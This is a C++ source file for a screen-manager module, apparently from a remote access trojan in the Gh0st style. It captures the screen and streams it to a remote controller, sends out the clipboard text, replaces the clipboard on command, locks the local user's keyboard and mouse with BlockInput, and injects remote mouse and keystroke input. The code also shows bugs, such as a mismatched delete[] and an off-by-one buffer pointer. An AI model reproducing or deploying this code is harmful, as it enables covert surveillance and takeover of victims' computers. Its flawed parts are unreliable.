#include "stdafx.h"
#include "ScreenManager.h"
#include"Common.h"

CScreenManager::CScreenManager(IOCPClient* ClientObject)
	:CManager(ClientObject)
{
	m_bIsWorking = TRUE;
	m_bIsBlockInput = FALSE;

	m_ScreenSpyObject = new CScreenSpy(16);
	if (m_ScreenSpyObject == NULL)
	{
		return;
	}
	m_WorkThreadHandle = CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThreadProc, this, 0, NULL);
}


CScreenManager::~CScreenManager()
{
	m_bIsWorking = FALSE;

	WaitForSingleObject(m_WorkThreadHandle, INFINITE);
	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
	}

	delete[] m_ScreenSpyObject;
	m_ScreenSpyObject = NULL;
}

DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
{
	CScreenManager* This = (CScreenManager*)lParam;

	This->SendBitMapInfor();

	This->WaitForDialogOpen();
	This->SendFirstScreen();

	while (This->m_bIsWorking)
	{
		This->SendNextScreen();

	}
	return 0;
}

VOID CScreenManager::SendBitMapInfor()
{
	ULONG ulLength = 1 + m_ScreenSpyObject->GetBISize();
	LPBYTE szBuffer = (LPBYTE)VirtualAlloc(NULL, ulLength, MEM_COMMIT, PAGE_READWRITE);
	szBuffer[0] = TOKEN_BITMAPINFO;
	memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
	m_ClientObject->OnServerSending((char*)szBuffer, ulLength);
	VirtualFree(szBuffer, 0, MEM_RELEASE);

}

VOID CScreenManager::SendFirstScreen()
{
	BOOL bReturn = FALSE;
	LPVOID FirstScreenData = NULL;
	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData();
	if (FirstScreenData == NULL)
	{
		return;
	}
	ULONG ulFirstSendLength = 1 + m_ScreenSpyObject->GetFirstScreenLength();
	LPBYTE szBuffer = new BYTE[ulFirstSendLength];
	if (szBuffer == NULL)
	{
		return;
	}
	szBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(szBuffer + 1, FirstScreenData, ulFirstSendLength - 1);
	m_ClientObject->OnServerSending((char*)szBuffer, ulFirstSendLength);
	delete[] szBuffer;
	szBuffer = NULL;
}

VOID CScreenManager::SendNextScreen()
{
	LPVOID NextScreenData = NULL;
	ULONG ulNextSendLength = 0;
	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);
	if (ulNextSendLength == 0 || NextScreenData == NULL)
	{
		return;

	}
	ulNextSendLength += 1;
	LPBYTE szBuffer = new BYTE[ulNextSendLength];
	if (szBuffer == NULL)
	{
		return;
	}
	szBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(szBuffer + 1, NextScreenData, ulNextSendLength - 1);
	m_ClientObject->OnServerSending((char*)szBuffer, ulNextSendLength);
	delete[] szBuffer;
	szBuffer = NULL;
}

VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		case COMMAND_NEXT:
		{
			NotifyDialogOpen();
			break;
		}
		case COMMAND_SCREEN_BLOCK_INPUT:
		{
			m_bIsBlockInput = *(LPBYTE)&szBuffer[1];
			//鼠标键盘的锁定
			BlockInput(m_bIsBlockInput);
			break;
		}
		case COMMAND_SCREEN_CONTROL:
		{
			BlockInput(FALSE);
			ProcessCommand(szBuffer - 1, ulLength - 1);
			BlockInput(m_bIsBlockInput);
			break;
		}
		case COMMAND_SCREEN_GET_CLIPBOARD:
		{
			SendClientClipboard();
			break;
		}
		case COMMAND_SCREEN_SET_CLIPBOARD:
		{
			UpdateClientClipboard((char*)szBuffer + 1, ulLength - 1);
			break;

		}
	}
}

VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength)
{
	if (!::OpenClipboard(NULL))
	{
		return;
	}
	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GPTR, ulLength);
	if (hGlobal != NULL)
	{
		LPTSTR szClipboardVirtualAddress = (LPTSTR)GlobalLock(hGlobal);
		memcpy(szClipboardVirtualAddress, szBuffer, ulLength);
		GlobalUnlock(hGlobal);
		SetClipboardData(CF_TEXT, hGlobal);
		GlobalFree(hGlobal);
	}
	CloseClipboard();
}
VOID CScreenManager::SendClientClipboard()
{
	//打开剪切板设备
	if (!::OpenClipboard(NULL))
	{
		return;
	}

	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);

	if (hGlobal == NULL)
	{
		::CloseClipboard();
		return;
	}

	int iBufferLength = GlobalSize(hGlobal) + 1;
	char* szClipboardVirtualAddress = (LPSTR)GlobalLock(hGlobal);

	LPBYTE szBuffer = new BYTE[iBufferLength];
	szBuffer[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(szBuffer + 1, szClipboardVirtualAddress, iBufferLength - 1);
	::GlobalUnlock(hGlobal);
	::CloseClipboard();
	m_ClientObject->OnServerSending((char*)szBuffer, iBufferLength);
	delete[] szBuffer;

}
VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
{
	if (ulLength % sizeof(MSG) != 0)
	{
		return;
	}
	// 命令个数
	ULONG	ulMsgCount = ulLength / sizeof(MSG);
	//处理
	for (int i = 0; i < ulMsgCount; i++)   //1
	{
		MSG	*Msg = (MSG *)(szBuffer + i * sizeof(MSG));
		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		{
			POINT Point;
			Point.x = LOWORD(Msg->lParam);
			Point.y = HIWORD(Msg->lParam);
			SetCursorPos(Point.x, Point.y);
			SetCapture(WindowFromPoint(Point));  //???
			break;

		}
		
		default:
			break;
		}

		switch (Msg->message)   
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0,
				GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}
